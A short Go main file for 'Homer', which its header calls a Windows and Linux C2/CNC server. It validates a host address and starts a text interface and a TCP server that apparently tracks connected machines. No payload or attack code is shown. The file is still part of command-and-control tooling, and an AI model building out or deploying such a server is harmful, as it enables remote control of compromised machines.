// Windows & Linux Homer C2/CNC Server
// github.com/kekws/homer

package main

import "fmt"

var ip string = "localhost" // ip of your server to host on
var port string = "8080"    // port of your server to host on

type Homer struct {
	theme        string
	author       string
	version      string
	startTime    string
	machineCount int
}

func main() {
	// Homer-CNC

	if !ValidateIPv4(ip) {
		fmt.Printf("[!] Invalid Host Address! '%s'", ip)
		ExitGracefully()
	}

	startRoutines()
}

func startRoutines() {
	// start gocui interface go-routine and tcp remote server handler

	UI = Interface{
		g: CreateInterface(),
	}
	go StartLoop()

	StartServer(ip, port)
}
